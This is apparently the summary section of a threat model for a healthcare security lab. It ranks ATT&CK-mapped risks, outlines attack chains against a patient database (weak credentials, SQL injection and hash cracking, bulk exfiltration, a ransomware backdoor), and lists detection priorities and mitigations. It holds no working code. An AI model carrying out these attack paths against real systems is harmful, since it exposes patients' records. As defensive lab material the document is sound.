1. **T1552.001** - Plaintext credentials in database (CRITICAL)
2. **T1078** - Weak/default credentials (CRITICAL)
3. **T1213** - PHI data exfiltration (CRITICAL)
4. **T1486** - Ransomware potential (CRITICAL)
5. **T1491** - Patient safety risk from data modification (CRITICAL)

**Primary Attack Paths:**
1. Weak credentials → Database access → Plaintext creds → Lateral movement
2. SQL injection → Hash extraction → Cracking → Admin access
3. Backup user compromise → Bulk data exfiltration → HIPAA breach
4. Application user abuse → CREATE backdoor → Ransomware

**Recommended Detection Priorities:**
1. Monitor `comments` table access (plaintext passwords)
2. Alert on new user creation
3. Detect bulk data queries (>100 rows)
4. Failed authentication attempts
5. Privilege escalation attempts (GRANT, CREATE USER)

**Key Mitigations:**
1. Replace MD5 with bcrypt/Argon2
2. Remove ALL plaintext credentials
3. Implement least privilege for all users
4. Enable comprehensive audit logging
5. Encrypt PHI data (especially SSNs)
6. Network segmentation (close port 3306)
7. Regular backups with testing
8. MFA for all administrative access

---

*Document Version: 1.0*  
*Last Updated: 2024-01-28*  
*MITRE ATT&CK Version: v14*  
*Project: MEDUSA Healthcare Security Lab*

